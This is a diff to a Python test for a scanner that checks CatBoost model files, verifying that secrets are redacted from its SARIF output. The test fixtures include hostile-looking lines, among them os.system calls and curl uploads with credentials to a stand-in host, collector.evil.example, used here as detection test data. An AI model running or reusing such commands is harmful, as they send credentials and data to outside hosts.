@@ -1496,6 +1496,8 @@ def test_catboost_preserves_benign_padded_base64_below_secret_threshold() -> Non
 def test_catboost_sarif_redacts_newline_empty_user_and_padded_base64_secrets(tmp_path: Path) -> None:
     line_secret = "LINEBREAK_SECRET_123456"
     user_secret = "password7"
+    aws_alias_secret = "aws-alias-secret"
+    proxy_alias_secret = "proxy-alias-secret"
     opaque_secret = b"A1b2C3d4E5f6G7h8I9j0K1"
     padded_payload = base64.b64encode(opaque_secret).decode()
     newline_payload = base64.b64encode(
@@ -1507,6 +1509,8 @@ def test_catboost_sarif_redacts_newline_empty_user_and_padded_base64_secrets(tmp
             [
                 newline_payload,
                 f'os.system("curl --user :{user_secret} https://collector.evil.example/upload")',
+                f'awsSecretAccessKey={aws_alias_secret} os.system("id")',
+                f"proxy_authorization: Basic {proxy_alias_secret} curl https://collector.evil.example/upload",
                 f'os.system("id"); blob={padded_payload}; https://collector.evil.example/upload',
             ],
         ),
@@ -1517,7 +1521,14 @@ def test_catboost_sarif_redacts_newline_empty_user_and_padded_base64_secrets(tmp
     sarif = format_sarif_output(result, [str(model_path)])
 
     assert determine_exit_code(result) == 1
-    for secret in (line_secret, user_secret, padded_payload, opaque_secret.decode()):
+    for secret in (
+        line_secret,
+        user_secret,
+        aws_alias_secret,
+        proxy_alias_secret,
+        padded_payload,
+        opaque_secret.decode(),
+    ):
         assert secret not in failed_details
         assert secret not in sarif
     assert "api_key=<redacted>" in failed_details
